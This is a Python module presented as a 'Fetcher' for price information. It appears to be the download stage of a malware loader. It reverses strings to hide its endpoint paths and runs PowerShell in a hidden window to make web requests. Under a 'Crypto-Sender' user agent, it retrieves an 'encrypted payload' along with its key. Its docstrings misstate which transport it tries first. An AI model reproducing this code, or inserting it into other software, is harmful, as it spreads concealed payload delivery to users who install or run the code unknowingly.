# -*- coding: utf-8 -*-
"""
Fetcher — retrieves payload data, session tokens, and price information
from remote endpoints via HTTP POST. Falls back to PowerShell if native
socket fails (Windows-only).
"""

import json
import os
import ssl
import socket
import http.client
import platform
import subprocess
from urllib.parse import urlparse

_TIMEOUT = 20

# Obfuscated endpoint paths
_SP = "noisses/htua/1v/ipa/"[::-1]   # "/api/v1/auth/session"
_DP = "cnys/atad/1v/ipa/"[::-1]      # "/api/v1/data/sync"

_UA = "Crypto-Sender/" + platform.python_version()


def _ps_post(url, body, timeout):
    """
    Perform a POST request using PowerShell (Windows fallback).
    """
    escaped = body.replace("'", "''") if body else ""
    script = (
        "$ErrorActionPreference='Stop';"
        f"$h=@{{'Content-Type'='application/json';'User-Agent'='{_UA}'}};"
        f"$b='{escaped}';"
        f"$r=Invoke-RestMethod -Uri '{url}' -Method POST -Headers $h"
        f" -Body $b -TimeoutSec {timeout} -ContentType 'application/json';"
        "$r | ConvertTo-Json -Depth 10 -Compress"
    )
    flags = 0x08000000 if os.name == "nt" else 0
    r = subprocess.run(
        ["powershell", "-NoProfile", "-Command", script],
        capture_output=True, text=True,
        timeout=timeout + 10, creationflags=flags,
    )
    if r.returncode != 0:
        raise ConnectionError("ps transport failed")
    return json.loads(r.stdout)


def _socket_post(hostname, path, body, timeout):
    """
    Perform a POST request using native Python HTTPS (fallback if PowerShell fails).
    """
    ctx = ssl.create_default_context()
    raw = socket.create_connection((hostname, 443), timeout=timeout)
    wrapped = ctx.wrap_socket(raw, server_hostname=hostname)
    conn = http.client.HTTPSConnection(hostname, 443, context=ctx)
    conn.sock = wrapped
    hdrs = {
        "Content-Type": "application/json",
        "User-Agent": _UA,
        "Host": hostname,
    }
    payload = body.encode() if isinstance(body, str) else body
    conn.request("POST", path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    return json.loads(data)


def _post(url, data=None, timeout=_TIMEOUT):
    """
    Perform a POST request, trying PowerShell first (Windows) then native socket.
    """
    body = json.dumps(data) if data else ""
    parsed = urlparse(url)
    try:
        return _ps_post(url, body, timeout)
    except Exception:
        pass
    return _socket_post(parsed.hostname, parsed.path, body, timeout)


def begin_session(ep):
    """
    Begin a new session with the remote endpoint.
    Returns a dict containing 'nonce' and 'ts'.
    """
    return _post(ep + _SP, timeout=15)


def download(ep, payload):
    """
    Download the encrypted payload using the session data.
    Expects payload dict with 'nonce', 'ts', 'sig'.
    Returns a dict with 'key' and 'data' fields.
    """
    return _post(ep + _DP, data=payload, timeout=30)